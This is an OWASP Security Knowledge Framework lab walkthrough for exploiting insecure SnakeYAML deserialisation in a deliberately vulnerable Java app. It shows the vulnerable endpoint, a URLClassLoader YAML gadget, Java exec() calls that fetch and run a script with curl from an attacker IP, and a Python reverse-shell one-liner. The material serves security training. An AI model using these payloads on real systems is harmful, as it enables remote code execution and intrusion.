# Deserialisation Yaml

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:java-des-yaml
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-des-yaml
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

This application is using a yaml serialised object to display the content in the HTML. As you can see below, the default base64 encoded string is loaded as part of the URL.

![](../../.gitbook/assets/java/DES-YAML/1.png)

By Base64 decoding you can see it uses a key value pair -> foo : value

![](../../.gitbook/assets/java/DES-YAML/2.png)

Also we can have a look at the documentation of the Python implementation for the .yaml file here:

{% embed url="https://yaml.readthedocs.io/en/latest/detail.html" %}

The application works by loading the Base64 encoded string to be processed by the application and use YAML to parse parse the key value to display the content in the application as shown below.

![](../../.gitbook/assets/java/DES-YAML/3.png)

In the code example the _input_ URL parameter is used to read the input value but as you can see this is under the users control. Instead of just sending the intended text over the request, a potential attacker could abuse this function to also supply his own crafted yaml that the attacker controls.

```python
    @GetMapping("/config/{input}")
    public String input(@PathVariable String input, Model model) {
        byte[] decodedInputBytes = Base64.getDecoder().decode(input);
        String decodedString = new String(decodedInputBytes);
        Yaml yaml = new Yaml();
        Object obj = yaml.load(decodedString);     
        model.addAttribute("content",obj.toString());
        return "index.html";
      }
```

## Exploitation

### Step 1

A potential attacker can now tamper the Base64 encoded yaml parameter that will be parsed by the application.

Let's try to craft or own yaml object and check whether the application will accept it or not.

```yaml
yaml: knoot knoot
```

Encode it in Base64 and put it in place the original yaml object.

```
eWFtbDoga25vdCBrbm9vb3QK
```

![](../../.gitbook/assets/java/DES-YAML/4.png)

As you can see our yaml object was accepted and parsed by the application.

When we will search on Java Yaml injections on the Internet we will learn that it's possible in Yaml and the Java implementation to invoke a subprocess that will allow us to execute commands. To perform this type of attack we need to use the following key value pair in our evil.yml file.

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://0.0.0.0:80"]
  ]]
]
```

Base64:

```
ISFqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciBbCiAgISFqYXZhLm5ldC5VUkxDbGFzc0xvYWRlciBbWwogICAgISFqYXZhLm5ldC5VUkwgWyJodHRwOi8vMC4wLjAuMDo4MCJdCiAgXV0KXQ==
```

Now when we submit the new yaml object we can see it launched HTTP request to destionation and we observed this outbound request on our web server. 

![](../../.gitbook/assets/java/DES-YAML/5.png)

Let's try getting a revershell!

We can use this [Java Yaml Payload Project](https://github.com/artsploit/yaml-payload) for generating payloads for the SnakeYAML deserialization to run commands on the target server.

We should alter the project as below so that it will run commands on the target server.
```
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://192.168.13.131:1234/revshell.sh -o /tmp/revshell.sh");
            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

After the changes, build the project and generate malicious .jar file to be executed by the target application

```
#Build:
javac <PATH>/yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java
```
```
#Generate Jar:
jar -cvf yaml-payload.jar -C <PATH>src/ .
```

The content of the revshell.sh is given below;
```
#!/bin/bash

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.13.131",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Please! change IP:Port according to your setup before usage.

The setup is ready and let's execute the attack...

![](../../.gitbook/assets/java/DES-YAML/6.png)

## Additional sources

{% embed url="https://www.owasp.org/index.php/Deserialization_Cheat_Sheet#Python" %}
